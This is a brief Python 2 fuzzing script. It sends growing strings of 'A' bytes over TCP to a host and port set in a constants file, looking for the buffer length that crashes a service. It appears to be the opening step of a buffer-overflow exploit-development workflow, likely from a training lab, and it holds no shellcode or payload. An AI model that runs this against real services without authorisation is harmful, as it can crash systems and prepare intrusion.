import socket
import sys
from constants import *

buffer = ["A"]
counter = 100

print "Paste the buffer length that causes crash into constants.py as BUFFER_TOTLEN"

while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter = counter + 200

for string in buffer:
    print "fuzzing %s bytes" % len(string)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    send_payload(s, string)
